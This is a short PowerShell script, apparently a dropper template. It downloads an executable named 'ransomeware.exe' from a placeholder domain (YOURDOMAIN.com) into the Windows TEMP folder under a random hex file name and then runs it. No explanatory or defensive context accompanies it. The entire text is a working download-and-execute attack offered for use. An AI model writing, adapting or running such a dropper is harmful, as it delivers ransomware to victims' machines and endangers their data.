$client = New-Object System.Net.WebClient
$downloadURL = "http://YOURDOMAIN.com/download/ransomeware.exe"
$path = ($env:TEMP) + "\18e190413af045db88dfbd29609eb877.exe"
$client.DownloadFile($downloadURL, $path)

cd $env:TEMP
./18e190413af045db88dfbd29609eb877.exe